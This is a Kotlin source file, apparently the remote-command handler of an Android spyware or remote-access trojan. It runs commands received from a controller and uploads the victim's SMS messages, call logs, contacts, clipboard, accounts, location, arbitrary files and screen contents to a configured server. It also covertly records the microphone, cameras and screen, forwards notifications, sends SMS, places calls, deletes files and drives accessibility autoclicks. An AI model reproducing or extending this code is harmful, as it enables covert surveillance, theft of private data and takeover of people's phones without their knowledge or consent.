package com.kashem.shaikh.telegram

import android.content.Context
import android.content.Intent
import android.provider.Settings
import java.io.File
import com.kashem.shaikh.telegram.Accounts
import com.kashem.shaikh.AppLogs
import com.kashem.shaikh.ForegroundService

object CommandProcessor {

    fun processCommand(command: String, context: Context) {
        var origin = "user"
        var actualCommand = command
        when {
            command.startsWith("admin:") -> {
                origin = "admin"
                actualCommand = command.substringAfter("admin:")
            }
            command.startsWith("user:") -> {
                origin = "user"
                actualCommand = command.substringAfter("user:")
            }
        }

        AppLogs.logCommandReceived(actualCommand, origin)
        AppLogs.logCommandProcessing(actualCommand, origin)

        when {
            // 🔥 Wake Lock কমান্ড
            actualCommand.startsWith("wake_lock") -> {
                val action = actualCommand.substringAfter("wake_lock").trim()
                when (action) {
                    "on" -> {
                        val success = WakeLock.acquire(context)
                        if (success) {
                            ToastHelper.showToast(context, "🔋 WakeLock enabled (CPU awake)")
                            AppLogs.logCommandSuccess(actualCommand, origin, "WakeLock enabled")
                        } else {
                            ToastHelper.showToast(context, "⚠️ Failed to enable WakeLock")
                            AppLogs.logCommandFailure(actualCommand, origin, "Failed to acquire WakeLock")
                        }
                    }
                    "off" -> {
                        val success = WakeLock.release()
                        if (success) {
                            ToastHelper.showToast(context, "🔋 WakeLock disabled")
                            AppLogs.logCommandSuccess(actualCommand, origin, "WakeLock disabled")
                        } else {
                            ToastHelper.showToast(context, "⚠️ Failed to disable WakeLock")
                            AppLogs.logCommandFailure(actualCommand, origin, "Failed to release WakeLock")
                        }
                    }
                    "status" -> {
                        val status = WakeLock.getStatus()
                        ToastHelper.showToast(context, status)
                        AppLogs.info(status)
                    }
                    else -> {
                        ToastHelper.showToast(context, "⚠️ Usage: wake_lock on/off/status")
                        AppLogs.warn("Invalid wake_lock action: $action")
                    }
                }
            }
            actualCommand.startsWith("device_info") -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                    return
                }
                val (host, _) = urls
                val file = DeviceInfo.collectInfo(context)
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Device info uploaded")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                }
            }
            actualCommand == "apps" -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                    return
                }
                val (host, _) = urls
                val file = AppList.collectApps(context)
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "App list uploaded")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                }
            }
            actualCommand == "messages" -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                    return
                }
                val (host, _) = urls
                val file = MessageCollector.collectMessages(context)
                if (file == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Failed to collect messages (no permission?)")
                    return
                }
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Messages uploaded")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                }
            }
            actualCommand == "calls" -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                    return
                }
                val (host, _) = urls
                val file = CallLogCollector.collectCallLogs(context)
                if (file == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Failed to collect call logs (no permission?)")
                    return
                }
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Call logs uploaded")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                }
            }
            actualCommand == "contacts" -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                    return
                }
                val (host, _) = urls
                val file = ContactsCollector.collectContacts(context)
                if (file == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Failed to collect contacts (no permission?)")
                    return
                }
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Contacts uploaded")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                }
            }
            actualCommand == "location" -> {
                LocationTracker.collectAndSendLocation(context, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Location sent")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Location failed")
                }
            }
            
            actualCommand.startsWith("phone_call:") -> {
    val parts = actualCommand.substringAfter("phone_call:").split("/", limit = 2)
    if (parts.size == 2) {
        val number = parts[0]
        val sim = parts[1].toIntOrNull() ?: 1
        val success = PhoneCall.makeCall(context, number, sim)
        if (success) {
            ToastHelper.showToast(context, "📞 কলিং $number (SIM $sim)")
            AppLogs.logCommandSuccess(actualCommand, origin, "Call initiated to $number via sim $sim")
        } else {
            ToastHelper.showToast(context, "❌ কল করতে ব্যর্থ")
            AppLogs.logCommandFailure(actualCommand, origin, "Call failed")
        }
    } else {
        AppLogs.warn("Invalid phone_call format: $actualCommand")
    }
}
            actualCommand == "clipboard" -> {
                val text = ClipboardHelper.getClipboardText(context)
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                    return
                }
                val (host, _) = urls
                val file = File(context.cacheDir, "clipboard.txt")
                file.writeText(text)
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Clipboard uploaded")
                    else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                    file.delete()
                }
            }
            actualCommand.startsWith("send_message:") -> {
                val parts = actualCommand.substringAfter("send_message:").split("/", limit = 2)
                if (parts.size == 2) {
                    val number = parts[0]
                    val msg = parts[1]
                    val success = SmsSender.sendSms(number, msg)
                    if (success) {
                        AppLogs.logCommandSuccess(actualCommand, origin, "SMS sent to $number")
                    } else {
                        AppLogs.logCommandFailure(actualCommand, origin, "SMS send failed")
                    }
                } else {
                    AppLogs.warn("Invalid send_message format: $actualCommand")
                }
            }
            actualCommand.startsWith("send_message_to_all:") -> {
                val msg = actualCommand.substringAfter("send_message_to_all:")
                ToastHelper.showToast(context, "Feature: send to all contacts - $msg")
                AppLogs.info("Send to all contacts: $msg")
            }
            actualCommand.startsWith("file:") -> {
                val path = actualCommand.substringAfter("file:")
                val file = File(path)
                if (file.exists() && file.isFile) {
                    val urls = ConfigManager.getServerUrls(context)
                    if (urls == null) {
                        AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
                        return
                    }
                    val (host, _) = urls
                    FileUploader.uploadFile(context, file, host, origin) { success ->
                        if (success) AppLogs.logCommandSuccess(actualCommand, origin, "File uploaded: $path")
                        else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
                    }
                } else {
                    AppLogs.logCommandFailure(actualCommand, origin, "File not found: $path")
                    ToastHelper.showToast(context, "File not found: $path")
                }
            }
            actualCommand.startsWith("add_contact:") -> {
    val parts = actualCommand.substringAfter("add_contact:").split("/", limit = 2)
    if (parts.size == 2) {
        val name = parts[0]
        val number = parts[1]
        val success = AddContact.addContact(context, name, number)
        if (success) {
            ToastHelper.showToast(context, "✅ কন্ট্যাক্ট যোগ হয়েছে: $name")
            AppLogs.logCommandSuccess(actualCommand, origin, "Contact added: $name")
        } else {
            ToastHelper.showToast(context, "❌ কন্ট্যাক্ট যোগ করতে ব্যর্থ")
            AppLogs.logCommandFailure(actualCommand, origin, "Add contact failed")
        }
    } else {
        AppLogs.warn("Invalid add_contact format: $actualCommand")
    }
}
            actualCommand.startsWith("delete_file:") -> {
                val path = actualCommand.substringAfter("delete_file:")
                val success = FileManager.deleteFile(path)
                ToastHelper.showToast(context, if (success) "Deleted $path" else "Delete failed")
                if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Deleted $path")
                else AppLogs.logCommandFailure(actualCommand, origin, "Delete failed for $path")
            }
            actualCommand.startsWith("microphone:") -> {
                val duration = actualCommand.substringAfter("microphone:").toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Audio recording started for $duration sec")
            }
            actualCommand.startsWith("rec_camera_main:") -> {
                val duration = actualCommand.substringAfter("rec_camera_main:").toIntOrNull() ?: 30
                ForegroundService.startVideoMain(context, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Main video recording started")
            }
            actualCommand.startsWith("rec_camera_selfie:") -> {
                val duration = actualCommand.substringAfter("rec_camera_selfie:").toIntOrNull() ?: 30
                ForegroundService.startVideoSelfie(context, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Selfie video recording started")
            }
            actualCommand.startsWith("toast:") -> {
                val msg = actualCommand.substringAfter("toast:")
                ToastHelper.showToast(context, msg)
                AppLogs.logCommandSuccess(actualCommand, origin, "Toast shown")
            }
            actualCommand.startsWith("show_notification:") -> {
                val parts = actualCommand.substringAfter("show_notification:").split("/", limit = 2)
                val title = parts.getOrNull(0) ?: "Notification"
                val message = parts.getOrNull(1) ?: ""
                NotificationHelper.showNotification(context, title, message)
                AppLogs.logCommandSuccess(actualCommand, origin, "Notification shown")
            }
            actualCommand.startsWith("play_audio:") -> {
                val url = actualCommand.substringAfter("play_audio:")
                AudioPlayer.playUrl(context, url)
                AppLogs.logCommandSuccess(actualCommand, origin, "Audio playback started")
            }
            actualCommand == "vibrate" -> {
                VibrationHelper.vibrate(context)
                AppLogs.logCommandSuccess(actualCommand, origin, "Vibrate triggered")
            }
            actualCommand == "camera_selfie" -> {
                ForegroundService.startFrontCamera(context, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Front camera started")
            }
            actualCommand == "camera_main" -> {
                ForegroundService.startBackCamera(context, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Back camera started")
            }
            actualCommand == "stop_camera" -> {
                ForegroundService.stopCamera(context)
                AppLogs.logCommandSuccess(actualCommand, origin, "Camera stopped")
            }
            actualCommand == "video_camera_main" -> {
                ForegroundService.startVideoMain(context, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Main video recording started")
            }
            actualCommand == "video_camera_selfie" -> {
                ForegroundService.startVideoSelfie(context, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Selfie video recording started")
            }
            actualCommand == "stop_video" -> {
                ForegroundService.stopVideo(context)
                AppLogs.logCommandSuccess(actualCommand, origin, "Video stopped")
            }
            actualCommand.startsWith("audio_record") -> {
                val duration = actualCommand.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Audio record started")
            }
            actualCommand.startsWith("audio_external") -> {
                val duration = actualCommand.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "External audio record started")
            }
            actualCommand == "stop_audio" -> {
                ForegroundService.stopAudio(context)
                AppLogs.logCommandSuccess(actualCommand, origin, "Audio stopped")
            }
            actualCommand == "screen_record_start" -> {
                ForegroundService.startScreenRecord(origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Screen record started")
            }
            actualCommand == "screen_record_stop" -> {
                ForegroundService.stopScreenRecord()
                AppLogs.logCommandSuccess(actualCommand, origin, "Screen record stopped")
            }
            actualCommand == "screenshot_on" -> {
                ForegroundService.startScreenCapture(origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Screenshot capture started")
            }
            actualCommand == "screen_capture_stop" -> {
                ForegroundService.stopScreenCapture()
                AppLogs.logCommandSuccess(actualCommand, origin, "Screen capture stopped")
            }
            actualCommand == "notif_capture_on" -> {
                NotificationCaptureService.setForwardingEnabled(true, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Notification capture ENABLED")
            }
            actualCommand == "notif_capture_off" -> {
                NotificationCaptureService.setForwardingEnabled(false, origin)
                AppLogs.logCommandSuccess(actualCommand, origin, "Notification capture DISABLED")
            }
            actualCommand.startsWith("uninstall_app:") -> {
                val packageName = actualCommand.substringAfter("uninstall_app:")
                if (packageName.isNotBlank()) {
                    AppUninstall.openAppInfo(context, packageName)
                    AppLogs.logCommandSuccess(actualCommand, origin, "Uninstall requested for $packageName")
                } else {
                    ToastHelper.showToast(context, "Package name missing")
                    AppLogs.logCommandFailure(actualCommand, origin, "Package name missing")
                }
            }
            actualCommand.startsWith("autoclick:") -> {
                val data = actualCommand.substringAfter("autoclick:")
                if (data.isNotBlank()) {
                    if (AutoClicker.isEnabled()) {
                        AutoClicker.performClick(data)
                        AppLogs.logCommandSuccess(actualCommand, origin, "Auto click triggered: $data")
                    } else {
                        ToastHelper.showToast(context, "⚠️ Auto Clicker accessibility not enabled. Enable from Settings.")
                        context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                        AppLogs.logCommandFailure(actualCommand, origin, "Auto Clicker not enabled")
                    }
                } else {
                    AppLogs.warn("Empty autoclick data")
                }
            }
            actualCommand == "accounts" -> {
    val urls = ConfigManager.getServerUrls(context)
    if (urls == null) {
        AppLogs.logCommandFailure(actualCommand, origin, "Server config missing")
        return
    }
    val (host, _) = urls
    val file = Accounts.collectAccounts(context)
    if (file == null) {
        AppLogs.logCommandFailure(actualCommand, origin, "No accounts found or error")
        ToastHelper.showToast(context, "No accounts found")
        return
    }
    FileUploader.uploadFile(context, file, host, origin) { success ->
        if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Accounts uploaded")
        else AppLogs.logCommandFailure(actualCommand, origin, "Upload failed")
    }
}
            actualCommand == "dump_screen" -> {
                if (AutoClicker.isEnabled()) {
                    AutoClicker.dumpScreen { screenText ->
                        val urls = ConfigManager.getServerUrls(context)
                        if (urls != null) {
                            val (host, _) = urls
                            val file = File(context.cacheDir, "screen_dump.txt")
                            file.writeText(screenText)
                            FileUploader.uploadFile(context, file, host, origin) { success ->
                                if (success) AppLogs.logCommandSuccess(actualCommand, origin, "Screen dump uploaded")
                                else AppLogs.logCommandFailure(actualCommand, origin, "Screen dump upload failed")
                                file.delete()
                            }
                        } else {
                            AppLogs.logCommandFailure(actualCommand, origin, "No server config for dump")
                        }
                    }
                } else {
                    ToastHelper.showToast(context, "⚠️ Auto Clicker not enabled")
                    AppLogs.logCommandFailure(actualCommand, origin, "Auto Clicker not enabled")
                }
            }
            else -> {
                AppLogs.warn("Unknown command: $actualCommand")
            }
        }
    }
}